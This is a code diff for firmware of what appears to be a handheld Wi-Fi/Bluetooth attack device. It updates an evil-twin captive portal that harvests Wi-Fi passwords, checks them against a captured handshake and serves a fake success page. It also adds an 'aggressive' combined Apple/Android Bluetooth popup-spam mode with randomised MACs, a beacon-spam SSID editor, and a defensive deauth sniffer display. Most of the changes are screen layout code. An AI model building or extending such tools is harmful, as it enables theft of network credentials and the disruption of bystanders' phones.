@@ -922,25 +922,20 @@ String password = webServer.arg("password");
 // ==================== UPDATED handlePortalPost() WITH REAL VALIDATION ====================
 void handlePortalPost() {
   if (webServer.hasArg("password")) {
-    if (password.length() > 63) {
-      Serial.println("[!] Password too long, truncating");
-      password = password.substring(0, 63);
-    }
-    password.replace("\0", "");
-    bool basicValid = validateWiFiPassword(password);
     String password = webServer.arg("password");
     if (password.length() > 63) {
       password = password.substring(0, 63);
     }
+    password.replace("\0", "");
+    
+    bool basicValid = validateWiFiPassword(password);
     
     // Real validation (slow, only if handshake captured)
     bool reallyCorrect = false;
     if (capturedHandshake.captured && basicValid) {
-      // This takes 2-3 seconds!
       reallyCorrect = validatePasswordWithHandshake(password, selectedSSID);
     } else {
-      // No handshake = can't truly validate
-      reallyCorrect = basicValid; // Best guess
+      reallyCorrect = basicValid;
     }
     
     // Find BSSID
@@ -968,7 +963,6 @@ void handlePortalPost() {
       capturedCreds[capturedCredCount].likelyCorrect = reallyCorrect;
       capturedCredCount++;
       
-      // Console log
       String validStr;
       if (capturedHandshake.captured) {
         validStr = reallyCorrect ? "VERIFIED CORRECT" : "VERIFIED WRONG";
@@ -987,29 +981,33 @@ void handlePortalPost() {
       Serial.printf("Total captured: %d\n\n", capturedCredCount);
     }
     
-    // Response page (success)
+    // SUCCESS RESPONSE (FIXED - No Chinese text)
     String html = "<!DOCTYPE html><html><head>";
-    html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+    html += "<meta name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1'>";
     html += "<meta http-equiv='refresh' content='3;url=/'>";
     html += "<style>";
+    html += "*{margin:0;padding:0;box-sizing:border-box;}";
     html += "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;";
-    html += "background:#e5e5e5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}";
-    html += ".container{background:#f0f0f0;padding:0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);max-width:450px;width:100%;}";
-    html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:30px;border-radius:12px 12px 0 0;";
+    html += "background:#e5e5e5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:15px;}";
+    html += ".container{background:#f0f0f0;padding:0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);";
+    html += "max-width:450px;width:100%;}";
+    html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:25px;border-radius:12px 12px 0 0;";
     html += "text-align:center;border-bottom:1px solid #b0b0b0;}";
     html += ".success-icon{width:80px;height:80px;margin:0 auto 15px;background:#34C759;border-radius:50%;";
     html += "display:flex;align-items:center;justify-content:center;box-shadow:0 2px 10px rgba(52,199,89,0.3);}";
     html += ".success-icon::after{content:'✓';color:#fff;font-size:50px;font-weight:bold;}";
-    html += ".content{padding:30px;text-align:center;}";
-    html += "h2{margin:0 0 15px;color:#000;font-size:20px;font-weight:600;}";
+    html += ".content{padding:25px;text-align:center;}";
+    html += "h2{margin:0 0 15px;color:#000;font-size:19px;font-weight:600;line-height:1.3;}";
     html += "p{color:#505050;margin:10px 0;font-size:14px;line-height:1.5;}";
-    html += ".network-name{font-weight:600;color:#000;}";
+    html += ".network-name{font-weight:600;color:#000;word-wrap:break-word;}";
     html += ".spinner{border:3px solid #e0e0e0;border-top:3px solid #007AFF;border-radius:50%;";
     html += "width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto;}";
     html += "@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}";
     html += ".footer{padding:15px;text-align:center;background:linear-gradient(180deg,#e8e8e8 0%,#d8d8d8 100%);";
     html += "border-radius:0 0 12px 12px;border-top:1px solid #c0c0c0;}";
     html += ".redirect-text{font-size:12px;color:#86868b;margin:0;}";
+    html += "@media (max-width: 400px){h2{font-size:17px;} .success-icon{width:60px;height:60px;}";
+    html += ".success-icon::after{font-size:40px;}}";
     html += "</style></head>";
     html += "<body><div class='container'>";
     html += "<div class='header'>";
@@ -1029,26 +1027,30 @@ void handlePortalPost() {
     webServer.send(200, "text/html", html);
     
   } else {
-    // Missing password
+    // ERROR RESPONSE - Missing password
     String html = "<!DOCTYPE html><html><head>";
-    html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+    html += "<meta name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1'>";
     html += "<style>";
+    html += "*{margin:0;padding:0;box-sizing:border-box;}";
     html += "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;";
-    html += "background:#e5e5e5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}";
-    html += ".container{background:#f0f0f0;padding:0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);max-width:450px;width:100%;}";
-    html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:30px;border-radius:12px 12px 0 0;";
+    html += "background:#e5e5e5;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:15px;}";
+    html += ".container{background:#f0f0f0;padding:0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);";
+    html += "max-width:450px;width:100%;}";
+    html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:25px;border-radius:12px 12px 0 0;";
     html += "text-align:center;border-bottom:1px solid #b0b0b0;}";
     html += ".error-icon{width:80px;height:80px;margin:0 auto 15px;background:#FF3B30;border-radius:50%;";
     html += "display:flex;align-items:center;justify-content:center;box-shadow:0 2px 10px rgba(255,59,48,0.3);}";
     html += ".error-icon::after{content:'!';color:#fff;font-size:50px;font-weight:bold;}";
-    html += ".content{padding:30px;text-align:center;}";
-    html += "h2{margin:0 0 15px;color:#000;font-size:20px;font-weight:600;}";
+    html += ".content{padding:25px;text-align:center;}";
+    html += "h2{margin:0 0 15px;color:#000;font-size:19px;font-weight:600;}";
     html += "p{color:#505050;margin:10px 0;font-size:14px;line-height:1.5;}";
     html += ".footer{padding:15px;text-align:center;background:linear-gradient(180deg,#e8e8e8 0%,#d8d8d8 100%);";
     html += "border-radius:0 0 12px 12px;border-top:1px solid #c0c0c0;}";
-    html += ".btn{display:inline-block;padding:8px 24px;background:#007AFF;color:#fff;text-decoration:none;";
-    html += "border-radius:6px;font-size:13px;font-weight:500;border:1px solid #007AFF;}";
+    html += ".btn{display:inline-block;padding:10px 24px;background:#007AFF;color:#fff;text-decoration:none;";
+    html += "border-radius:6px;font-size:14px;font-weight:500;border:1px solid #007AFF;}";
     html += ".btn:active{background:#0051D5;}";
+    html += "@media (max-width: 400px){h2{font-size:17px;} .error-icon{width:60px;height:60px;}";
+    html += ".error-icon::after{font-size:40px;}}";
     html += "</style></head>";
     html += "<body><div class='container'>";
     html += "<div class='header'>";
@@ -1680,6 +1682,7 @@ void displayDeauthSnifferActive() {
   blink = !blink;
   tft.fillCircle(220, 12, 3, blink ? COLOR_RED : COLOR_DARK_GREEN);
   
+  // Stats bar - compact
   int statsY = HEADER_HEIGHT + 5;
   tft.setTextSize(1);
   tft.setTextColor(COLOR_TEXT);
@@ -1692,43 +1695,50 @@ void displayDeauthSnifferActive() {
   
   // Alert if deauths detected
   if (detectedDeauths > 0) {
-    tft.setCursor(SIDE_MARGIN, statsY + 12);
     tft.setTextColor(COLOR_RED);
+    tft.setCursor(SIDE_MARGIN, statsY + 12);
     tft.print("! ATTACK DETECTED !");
   }
   
-  int listY = HEADER_HEIGHT + 35;
-  tft.drawLine(0, listY - 2, SCREEN_WIDTH, listY - 2, COLOR_BORDER);
-  
   // Column headers
+  int listY = detectedDeauths > 0 ? HEADER_HEIGHT + 32 : HEADER_HEIGHT + 22;
+  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
+  
   tft.setTextSize(1);
   tft.setTextColor(COLOR_DARK_GREEN);
   tft.setCursor(SIDE_MARGIN, listY);
-  tft.print("SOURCE");
-  tft.setCursor(120, listY);
-  tft.print("TARGET");
+  tft.print("SOURCE -> TARGET");
+  tft.setCursor(180, listY);
+  tft.print("AGE");
   
   tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
   listY += 15;
   
-  int visibleEvents = MAX_DEAUTH_DISPLAY;
+  // Calculate pagination
+  const int EVENTS_PER_PAGE = 9;
   int totalEvents = deauthEventCount;
+  int totalPages = (totalEvents + EVENTS_PER_PAGE - 1) / EVENTS_PER_PAGE;
+  int currentPage = deauthScrollOffset / EVENTS_PER_PAGE;
   
   if (totalEvents == 0) {
     tft.setTextSize(1);
     tft.setTextColor(COLOR_GREEN);
-    tft.setCursor(SIDE_MARGIN, listY + 40);
+    tft.setCursor(SIDE_MARGIN, listY + 60);
     tft.print("No deauth attacks detected");
-    tft.setCursor(SIDE_MARGIN, listY + 55);
+    tft.setCursor(SIDE_MARGIN, listY + 75);
     tft.setTextColor(COLOR_TEXT);
     tft.print("Network is clean");
   } else {
-    for (int i = 0; i < visibleEvents && (deauthScrollOffset + i) < totalEvents; i++) {
-      int idx = totalEvents - 1 - deauthScrollOffset - i;  // Newest first
+    // Display events for current page (newest first)
+    int startIdx = deauthScrollOffset;
+    int endIdx = min(startIdx + EVENTS_PER_PAGE, totalEvents);
+    
+    for (int i = 0; i < (endIdx - startIdx); i++) {
+      int idx = totalEvents - 1 - startIdx - i;
       
       if (idx < 0 || idx >= totalEvents) continue;
       
-      int y = listY + (i * 32);
+      int y = listY + (i * 28);
       
       // Warning indicator
       tft.setTextColor(COLOR_RED);
@@ -1736,7 +1746,7 @@ void displayDeauthSnifferActive() {
       tft.setCursor(SIDE_MARGIN, y);
       tft.print("[!]");
       
-      // Source MAC
+      // Source MAC (first 3 octets)
       tft.setTextColor(COLOR_ORANGE);
       tft.setCursor(SIDE_MARGIN + 20, y);
       tft.printf("%02X:%02X:%02X", 
@@ -1746,54 +1756,63 @@ void displayDeauthSnifferActive() {
       
       // Arrow
       tft.setTextColor(COLOR_DARK_GREEN);
-      tft.setCursor(SIDE_MARGIN + 72, y);
+      tft.setCursor(SIDE_MARGIN + 70, y);
       tft.print("->");
       
-      // Target MAC
-      tft.setTextColor(COLOR_TEXT);
+      // Target MAC (first 3 octets)
+      tft.setTextColor(COLOR_CYAN);
       tft.setCursor(SIDE_MARGIN + 90, y);
       tft.printf("%02X:%02X:%02X", 
                  deauthEvents[idx].targetMAC[0],
                  deauthEvents[idx].targetMAC[1],
                  deauthEvents[idx].targetMAC[2]);
       
-      // Details line
-      tft.setTextColor(COLOR_CYAN);
+      // Time ago
+      unsigned long ago = (millis() - deauthEvents[idx].timestamp) / 1000;
+      tft.setTextColor(COLOR_TEXT);
+      tft.setCursor(180, y);
+      if (ago < 60) {
+        tft.printf("%ds", ago);
+      } else {
+        tft.printf("%dm", ago / 60);
+      }
+      
+      // Details line (channel + RSSI)
+      tft.setTextColor(COLOR_DARK_GREEN);
       tft.setCursor(SIDE_MARGIN + 20, y + 10);
       tft.printf("Ch%d", deauthEvents[idx].channel);
       
       tft.setTextColor(COLOR_YELLOW);
-      tft.setCursor(SIDE_MARGIN + 50, y + 10);
+      tft.setCursor(SIDE_MARGIN + 60, y + 10);
       tft.printf("%ddBm", deauthEvents[idx].rssi);
-      
-      // Time ago
-      unsigned long ago = (millis() - deauthEvents[idx].timestamp) / 1000;
-      tft.setTextColor(COLOR_TEXT);
-      tft.setCursor(SIDE_MARGIN + 90, y + 10);
-      if (ago < 60) {
-        tft.printf("%ds ago", ago);
-      } else {
-        tft.printf("%dm ago", ago / 60);
-      }
     }
   }
   
-  // Scroll indicator
-  if (totalEvents > visibleEvents) {
-    tft.setTextColor(COLOR_PURPLE);
+  // ✅ FIXED: Footer with pagination - no overlap with stop button
+  int footerY = 275;  // Moved up from 280 to avoid overlap
+  
+  if (totalPages > 1) {
+    tft.drawFastHLine(0, footerY, 240, COLOR_DARK_GREEN);
     tft.setTextSize(1);
-    tft.setCursor(SCREEN_WIDTH / 2 - 40, listY + (visibleEvents * 32) + 5);
-    tft.printf("Scroll %d/%d", (deauthScrollOffset / visibleEvents) + 1, 
-               (totalEvents + visibleEvents - 1) / visibleEvents);
+    tft.setTextColor(COLOR_CYAN);
+    tft.setCursor(SIDE_MARGIN, footerY + 5);
+    tft.printf("Page %d/%d", currentPage + 1, totalPages);
+    
+    tft.setTextColor(COLOR_TEXT);
+    tft.setCursor(120, footerY + 5);
+    tft.print("Tap to scroll");
   }
   
-  tft.setTextSize(1);
-  tft.setTextColor(COLOR_ACCENT);
-  tft.setCursor(70, SCREEN_HEIGHT - 80);
-  tft.println("Tap to stop");
+  // ✅ FIXED: Consistent stop button style
+  int backY = 305;
+  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
+  tft.setTextColor(COLOR_RED);
+  tft.setCursor(75, backY + 3);
+  tft.print("[TAP] Stop");
 }
 
 void handleDeauthSnifferMenuTouch(int x, int y) {
+  // Back button
   if (y > 300) {
     if (deauthSnifferActive) stopDeauthSniffer();
     currentState = MORE_TOOLS_MENU;
@@ -1802,6 +1821,31 @@ void handleDeauthSnifferMenuTouch(int x, int y) {
     return;
   }
   
+  // Deauth sniffer is active - handle scrolling and stop
+  if (currentState == DEAUTH_SNIFFER_ACTIVE) {
+    int totalEvents = deauthEventCount;
+    const int EVENTS_PER_PAGE = 9;
+    int totalPages = (totalEvents + EVENTS_PER_PAGE - 1) / EVENTS_PER_PAGE;
+    
+    if (y > 300) {
+      // Stop button
+      stopDeauthSniffer();
+      currentState = DEAUTH_SNIFFER;
+      drawDeauthSnifferMenu();
+    } else if (y > 280) {
+      // Footer area - ignore
+      return;
+    } else if (totalPages > 1) {
+      // Scroll through pages
+      int currentPage = deauthScrollOffset / EVENTS_PER_PAGE;
+      currentPage = (currentPage + 1) % totalPages;
+      deauthScrollOffset = currentPage * EVENTS_PER_PAGE;
+      displayDeauthSnifferActive();
+    }
+    return;
+  }
+  
+  // Menu interaction
   int startY = HEADER_HEIGHT + 10;
   int buttonIndex = getTouchedButtonIndex(y, startY);
   
@@ -2457,18 +2501,23 @@ void drawBeaconManager() {
 }
 
 String beaconInputSSID = "";
+bool shiftActive = false;
+bool symbolsActive = false;
 
+// ==================== FIXED: drawBeaconAddScreen() ====================
 void drawBeaconAddScreen() {
   tft.fillScreen(COLOR_BG);
   drawTerminalHeader("add beacon");
   
+  // Input box
   int inputY = HEADER_HEIGHT + 10;
-  tft.fillRect(SIDE_MARGIN, inputY, BUTTON_WIDTH, 30, COLOR_ITEM_BG);
-  tft.drawRect(SIDE_MARGIN, inputY, BUTTON_WIDTH, 30, COLOR_MATRIX_GREEN);
+  int inputHeight = 40;
+  tft.fillRect(SIDE_MARGIN, inputY, 240 - (2 * SIDE_MARGIN), inputHeight, COLOR_ITEM_BG);
+  tft.drawRect(SIDE_MARGIN, inputY, 240 - (2 * SIDE_MARGIN), inputHeight, COLOR_MATRIX_GREEN);
   
   tft.setTextSize(2);
   tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 5, inputY + 8);
+  tft.setCursor(SIDE_MARGIN + 5, inputY + 12);
   if (beaconInputSSID.length() > 0) {
     String display = beaconInputSSID;
     if (display.length() > 15) display = display.substring(0, 15);
@@ -2478,21 +2527,47 @@ void drawBeaconAddScreen() {
     tft.print("Enter SSID...");
   }
   
-  // NEW KEYBOARD - lowercase + numbers
-  int keyY = inputY + 40;
-  const char* keyboard[4][10] = {
-    {"q", "w", "e", "r", "t", "y", "u", "i", "o", "p"},
-    {"a", "s", "d", "f", "g", "h", "j", "k", "l", "_"},
-    {"z", "x", "c", "v", "b", "n", "m", "-", ".", " "},
-    {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}
-  };
-  
+  // Keyboard layout
+  int keyY = inputY + inputHeight + 15;
   int keyW = 22;
-  int keyH = 26;
+  int keyH = 28;
   int keySpacing = 2;
   
+  const char* keyboard_lower[4][10] = {
+    {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"},
+    {"q", "w", "e", "r", "t", "y", "u", "i", "o", "p"},
+    {"a", "s", "d", "f", "g", "h", "j", "k", "l", " "},
+    {"z", "x", "c", "v", "b", "n", "m", "_", "-", "."}
+  };
+  
+  const char* keyboard_upper[4][10] = {
+    {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
+    {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"},
+    {"A", "S", "D", "F", "G", "H", "J", "K", "L", " "},
+    {"Z", "X", "C", "V", "B", "N", "M", "_", "-", "."}
+  };
+  
+  const char* keyboard_symbols[4][10] = {
+    {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
+    {"[", "]", "{", "}", "<", ">", "|", "\\", "/", "?"},
+    {"+", "=", "~", "`", ":", ";", "'", "\"", ",", " "},
+    {".", "_", "-", " ", " ", " ", " ", " ", " ", " "}
+  };
+  
+  const char* (*current_layout)[10];
+  if (symbolsActive) {
+    current_layout = keyboard_symbols;
+  } else if (shiftActive) {
+    current_layout = keyboard_upper;
+  } else {
+    current_layout = keyboard_lower;
+  }
+  
+  // Draw keyboard
   for (int row = 0; row < 4; row++) {
-    for (int col = 0; col < 10; col++) {
+    int keysInRow = (row < 3) ? 10 : 9;
+    
+    for (int col = 0; col < keysInRow; col++) {
       int x = SIDE_MARGIN + (col * (keyW + keySpacing));
       int y = keyY + (row * (keyH + keySpacing));
       
@@ -2501,34 +2576,240 @@ void drawBeaconAddScreen() {
       
       tft.setTextSize(1);
       tft.setTextColor(COLOR_MATRIX_GREEN);
-      tft.setCursor(x + 7, y + 9);
-      tft.print(keyboard[row][col]);
+      
+      int textX = x + (keyW / 2) - 3;
+      int textY = y + (keyH / 2) - 4;
+      
+      tft.setCursor(textX, textY);
+      tft.print(current_layout[row][col]);
     }
   }
   
-  int controlY = keyY + (4 * (keyH + keySpacing)) + 5;
-  
-  // BACKSPACE button
-  tft.fillRect(SIDE_MARGIN, controlY, 70, 25, COLOR_WARNING);
-  tft.drawRect(SIDE_MARGIN, controlY, 70, 25, COLOR_CRITICAL);
+  // ✅ FIXED: Control row - CENTERED
+  int controlY = keyY + (4 * (keyH + keySpacing)) + 8;
+
+  int shiftW = 45;
+  int spaceW = 80;
+  int symW = 50;
+  int totalControlWidth = shiftW + 5 + spaceW + 5 + symW;
+  int controlStartX = (240 - totalControlWidth) / 2;
+
+  // SHIFT
+  tft.fillRect(controlStartX, controlY, shiftW, 28, shiftActive ? COLOR_GREEN : COLOR_HEADER);
+  tft.drawRect(controlStartX, controlY, shiftW, 28, COLOR_DARK_GREEN);
+  tft.setTextSize(1);
+  tft.setTextColor(shiftActive ? COLOR_BG : COLOR_MATRIX_GREEN);
+  tft.setCursor(controlStartX + 6, controlY + 10);
+  tft.print("SHIFT");
+
+  // SPACE
+  int spaceX = controlStartX + shiftW + 5;
+  tft.fillRect(spaceX, controlY, spaceW, 28, COLOR_HEADER);
+  tft.drawRect(spaceX, controlY, spaceW, 28, COLOR_DARK_GREEN);
+  tft.setTextColor(COLOR_MATRIX_GREEN);
+  tft.setCursor(spaceX + 22, controlY + 10);
+  tft.print("SPACE");
+
+  // SYM
+  int symX = spaceX + spaceW + 5;
+  tft.fillRect(symX, controlY, symW, 28, symbolsActive ? COLOR_CYAN : COLOR_HEADER);
+  tft.drawRect(symX, controlY, symW, 28, COLOR_DARK_GREEN);
+  tft.setTextColor(symbolsActive ? COLOR_BG : COLOR_MATRIX_GREEN);
+  tft.setCursor(symX + 10, controlY + 10);
+  tft.print("SYM");
+
+  controlY += 36;
+
+  // Match top-row width style: 45 - 80 - 50
+  int delW = 45;
+  int saveW = 80;
+  int cancelW = 50;
+
+  int totalActionWidth = delW + 5 + saveW + 5 + cancelW;
+  int actionStartX = (240 - totalActionWidth) / 2;
+
+  // DELETE (LEFT)
+  tft.fillRect(actionStartX, controlY, delW, 28, COLOR_WARNING);
+  tft.drawRect(actionStartX, controlY, delW, 28, COLOR_CRITICAL);
   tft.setTextSize(1);
   tft.setTextColor(COLOR_BG);
-  tft.setCursor(SIDE_MARGIN + 10, controlY + 9);
-  tft.print("BACKSPACE");
-  
-  // SAVE button
-  tft.fillRect(SIDE_MARGIN + 75, controlY, 70, 25, COLOR_SUCCESS);
-  tft.drawRect(SIDE_MARGIN + 75, controlY, 70, 25, COLOR_MATRIX_GREEN);
+  tft.setCursor(actionStartX + 10, controlY + 10);
+  tft.print("DEL");
+
+  // SAVE (CENTER)
+  int saveX = actionStartX + delW + 5;
+  tft.fillRect(saveX, controlY, saveW, 28, COLOR_SUCCESS);
+  tft.drawRect(saveX, controlY, saveW, 28, COLOR_MATRIX_GREEN);
   tft.setTextColor(COLOR_BG);
-  tft.setCursor(SIDE_MARGIN + 95, controlY + 9);
+  tft.setCursor(saveX + 24, controlY + 10);
   tft.print("SAVE");
-  
-  // CANCEL button
-  tft.fillRect(SIDE_MARGIN + 150, controlY, 70, 25, COLOR_CRITICAL);
-  tft.drawRect(SIDE_MARGIN + 150, controlY, 70, 25, COLOR_WARNING);
+
+  // CANCEL (RIGHT)
+  int cancelX = saveX + saveW + 5;
+  tft.fillRect(cancelX, controlY, cancelW, 28, COLOR_CRITICAL);
+  tft.drawRect(cancelX, controlY, cancelW, 28, COLOR_WARNING);
   tft.setTextColor(COLOR_TEXT);
-  tft.setCursor(SIDE_MARGIN + 162, controlY + 9);
+  tft.setCursor(cancelX + 6, controlY + 10);
   tft.print("CANCEL");
+}
+
+// ==================== FIXED: handleBeaconAddTouch() ====================
+void handleBeaconAddTouch(int x, int y) {
+  int inputY = HEADER_HEIGHT + 10;
+  int inputHeight = 40;
+  int keyY = inputY + inputHeight + 15;
+  int keyW = 22;
+  int keyH = 28;
+  int keySpacing = 2;
+  
+  const char* keyboard_lower[4][10] = {
+    {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"},
+    {"q", "w", "e", "r", "t", "y", "u", "i", "o", "p"},
+    {"a", "s", "d", "f", "g", "h", "j", "k", "l", " "},
+    {"z", "x", "c", "v", "b", "n", "m", "_", "-", "."}
+  };
+  
+  const char* keyboard_upper[4][10] = {
+    {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
+    {"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P"},
+    {"A", "S", "D", "F", "G", "H", "J", "K", "L", " "},
+    {"Z", "X", "C", "V", "B", "N", "M", "_", "-", "."}
+  };
+  
+  const char* keyboard_symbols[4][10] = {
+    {"!", "@", "#", "$", "%", "^", "&", "*", "(", ")"},
+    {"[", "]", "{", "}", "<", ">", "|", "\\", "/", "?"},
+    {"+", "=", "~", "`", ":", ";", "'", "\"", ",", " "},
+    {".", "_", "-", " ", " ", " ", " ", " ", " ", " "}
+  };
+  
+  const char* (*current_layout)[10];
+  if (symbolsActive) {
+    current_layout = keyboard_symbols;
+  } else if (shiftActive) {
+    current_layout = keyboard_upper;
+  } else {
+    current_layout = keyboard_lower;
+  }
+  
+  // Check keyboard keys
+  for (int row = 0; row < 4; row++) {
+    int keysInRow = (row < 3) ? 10 : 9;
+    
+    for (int col = 0; col < keysInRow; col++) {
+      int keyX = SIDE_MARGIN + (col * (keyW + keySpacing));
+      int keyYPos = keyY + (row * (keyH + keySpacing));
+      
+      if (x >= keyX && x <= keyX + keyW && y >= keyYPos && y <= keyYPos + keyH) {
+        if (beaconInputSSID.length() < 32) {
+          beaconInputSSID += current_layout[row][col];
+          drawBeaconAddScreen();
+        }
+        return;
+      }
+    }
+  }
+  
+  // ✅ FIXED: Control row checks - CENTERED positions
+  int controlY = keyY + (4 * (keyH + keySpacing)) + 8;
+  
+  int shiftW = 45;
+  int spaceW = 80;
+  int symW = 50;
+  int totalControlWidth = shiftW + 5 + spaceW + 5 + symW;
+  int controlStartX = (240 - totalControlWidth) / 2;
+  
+  // SHIFT (left)
+  if (x >= controlStartX && x <= controlStartX + shiftW && 
+      y >= controlY && y <= controlY + 28) {
+    shiftActive = !shiftActive;
+    if (shiftActive) symbolsActive = false;
+    drawBeaconAddScreen();
+    return;
+  }
+  
+  // SPACE (center)
+  int spaceX = controlStartX + shiftW + 5;
+  if (x >= spaceX && x <= spaceX + spaceW && 
+      y >= controlY && y <= controlY + 28) {
+    if (beaconInputSSID.length() < 32) {
+      beaconInputSSID += " ";
+      drawBeaconAddScreen();
+    }
+    return;
+  }
+  
+  // SYMBOLS (right)
+  int symX = spaceX + spaceW + 5;
+  if (x >= symX && x <= symX + symW && 
+      y >= controlY && y <= controlY + 28) {
+    symbolsActive = !symbolsActive;
+    if (symbolsActive) shiftActive = false;
+    drawBeaconAddScreen();
+    return;
+  }
+  
+  // ✅ FIXED: Action buttons - SWAPPED positions (SAVE left, CANCEL right)
+  controlY += 36;
+  int totalActionWidth = 55 + 5 + 55 + 5 + 65;
+  int actionStartX = (240 - totalActionWidth) / 2;
+  
+  // SAVE (now on LEFT)
+  if (x >= actionStartX && x <= actionStartX + 55 && 
+      y >= controlY && y <= controlY + 28) {
+    if (beaconInputSSID.length() > 0 && customBeaconCount < 20) {
+      customBeacons[customBeaconCount] = beaconInputSSID;
+      customBeaconCount++;
+      addToConsole("Added: " + beaconInputSSID);
+      beaconInputSSID = "";
+      shiftActive = false;
+      symbolsActive = false;
+      currentState = BEACON_MANAGER;
+      drawBeaconManager();
+    }
+    return;
+  }
+  
+  // BACKSPACE (center)
+  int delX = actionStartX + 60;
+  if (x >= delX && x <= delX + 55 && 
+      y >= controlY && y <= controlY + 28) {
+    if (beaconInputSSID.length() > 0) {
+      beaconInputSSID.remove(beaconInputSSID.length() - 1);
+      drawBeaconAddScreen();
+    }
+    return;
+  }
+  
+  // CANCEL (now on RIGHT)
+  int cancelX = delX + 60;
+  if (x >= cancelX && x <= cancelX + 65 && 
+      y >= controlY && y <= controlY + 28) {
+    beaconInputSSID = "";
+    shiftActive = false;
+    symbolsActive = false;
+    currentState = BEACON_MANAGER;
+    drawBeaconManager();
+    return;
+  }
+}
+
+void deleteBeacon(int index) {
+  if (index < 0 || index >= customBeaconCount) return;
+  
+  addToConsole("Deleted: " + customBeacons[index]);
+  
+  // Shift array
+  for (int i = index; i < customBeaconCount - 1; i++) {
+    customBeacons[i] = customBeacons[i + 1];
+  }
+  customBeaconCount--;
+  
+  // Adjust scroll if needed
+  if (beaconDisplayOffset >= customBeaconCount && beaconDisplayOffset > 0) {
+    beaconDisplayOffset -= MAX_DISPLAY_BEACONS;
+    if (beaconDisplayOffset < 0) beaconDisplayOffset = 0;
+  }
 }
 
 void drawBLEMenu() {
@@ -2657,7 +2938,7 @@ void drawSnifferMenu() {
   tft.setTextColor(COLOR_GREEN);
   tft.printf("%d", packetCount);
   
-  // Back button
+  // Back button (consistent style)
   int backY = 305;
   tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
   tft.setTextColor(COLOR_RED);
@@ -2741,17 +3022,18 @@ void drawSpamMenu() {
   
   const char* menuItems[] = {
     appleSpamActive ? "Stop Apple" : "Apple Spam",
-    androidSpamActive ? "Stop Android" : "Android Spam"
+    androidSpamActive ? "Stop Android" : "Android Spam",
+    (appleSpamActive && androidSpamActive) ? "Stop Combined" : "Combined Spam"
   };
   
   int y = HEADER_HEIGHT + 10;
-  for (int i = 0; i < 2; i++) {
+  for (int i = 0; i < 3; i++) {
     drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
     y += MENU_ITEM_HEIGHT + MENU_SPACING;
   }
   
   // Status section
-  y = HEADER_HEIGHT + 80;
+  y = HEADER_HEIGHT + 100;
   tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
   y += 10;
   
@@ -2784,6 +3066,20 @@ void drawSpamMenu() {
     tft.printf("(%d)", androidSpamCount);
   }
   
+  y += 20;
+  
+  // Packets per second
+  if (appleSpamActive || androidSpamActive) {
+    tft.setTextColor(COLOR_DARK_GREEN);
+    tft.setCursor(SIDE_MARGIN, y);
+    tft.print("Rate: ");
+    tft.setTextColor(COLOR_GREEN);
+    
+    unsigned long runtime = max(1UL, (millis() - lastAppleSpam) / 1000);
+    uint32_t pps = (appleSpamCount + androidSpamCount) / runtime;
+    tft.printf("~%d pkt/s", pps);
+  }
+  
   y += 25;
   tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
   y += 10;
@@ -2791,13 +3087,19 @@ void drawSpamMenu() {
   // Info
   tft.setTextColor(COLOR_TEXT);
   tft.setCursor(SIDE_MARGIN, y);
-  tft.println("Creates popup dialogs on");
+  tft.println("AGGRESSIVE MODE:");
   y += 12;
   tft.setCursor(SIDE_MARGIN, y);
-  tft.println("nearby phones (discovery)");
+  tft.println("- 50 pkt/sec per type");
   y += 12;
   tft.setCursor(SIDE_MARGIN, y);
-  tft.println("Does NOT disconnect devices");
+  tft.println("- Random MAC each packet");
+  y += 12;
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("- All device models");
+  y += 12;
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("- Combined = 100 pkt/sec!");
   
   // Back button
   int backY = 305;
@@ -3614,88 +3916,8 @@ void handleBeaconManagerTouch(int x, int y) {
   }
 }
 
-void handleBeaconAddTouch(int x, int y) {
-  int inputY = HEADER_HEIGHT + 10;
-  int keyY = inputY + 40;
-  int keyW = 22;
-  int keyH = 26;
-  int keySpacing = 2;
-  
-  // NEW KEYBOARD - lowercase + numbers
-  const char* keyboard[4][10] = {
-    {"q", "w", "e", "r", "t", "y", "u", "i", "o", "p"},
-    {"a", "s", "d", "f", "g", "h", "j", "k", "l", "_"},
-    {"z", "x", "c", "v", "b", "n", "m", "-", ".", " "},
-    {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0"}
-  };
-  
